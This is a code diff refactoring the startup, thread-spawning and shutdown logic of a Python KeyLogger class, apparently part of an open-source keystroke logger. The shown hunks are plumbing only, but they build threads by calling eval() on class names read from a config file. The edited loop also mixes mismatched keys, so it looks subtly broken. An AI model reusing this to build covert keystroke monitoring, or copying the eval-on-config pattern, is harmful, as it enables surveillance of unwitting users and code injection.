@@ -61,20 +61,14 @@ class KeyLogger:
        '''
     def __init__(self):
         self.parse_options() # stored in self.cmdoptions
-        self.ParseConfigFile() # stored in self.settings
+        self.parse_config_file() # stored in self.settings
         self.parse_control_key()
         self.NagscreenLogic()
         self.process_settings()
         os.chdir(self.settings['General']['Log Directory'])
         self.create_loggers()
-        #self.q_logwriter = Queue.Queue(0)
-        #self.q_imagewriter = Queue.Queue(0)
-        #self.lw = LogWriter(self.settings,
-                            #self.cmdoptions,
-                            #self.q_logwriter)
-        #self.iw = ImageWriter(self.settings,
-                              #self.cmdoptions,
-                              #self.q_imagewriter)
+        self.spawn_event_threads()
+        
         if os.name == 'posix':
             self.hashchecker = ControlKeyMonitor(self.cmdoptions,
                                                  self.lw,
@@ -102,18 +96,18 @@ class KeyLogger:
         self.queues = {}
         for section in self.settings.sections:
             try:
-                threadname = section['General']['_Thread_Class']
-                self.queues[threadname] = Queue(0)
-                self.timer_threads[threadname] = \
+                threadname = self.settings[section]['General']['_Thread_Class']
+                self.queues[section] = Queue(0)
+                self.timer_threads[section] = \
                         eval(section['General']['_Thread_Class'] + \
-                        '(self.queues[threadname], section.name)') ## confirm the section.name bit
+                        '(self.queues[threadname], section)')
             except KeyError:
                 pass # this is not a thread to be started.
     
     def start(self):
         #self.lw.start()
         #self.iw.start()
-        for key in self.event_threads.keys:
+        for key in self.event_threads.keys():
             self.event_threads[key].start()
         
         if os.name == 'nt':
@@ -213,8 +207,9 @@ class KeyLogger:
         if os.name == 'posix':
             self.hm.cancel()
             self.hashchecker.cancel()
-        self.lw.cancel()
-        self.iw.cancel()
+        
+        for key in self.event_threads.keys():
+            self.event_threads[key].cancel()
         
         #print threading.enumerate()
         sys.exit()
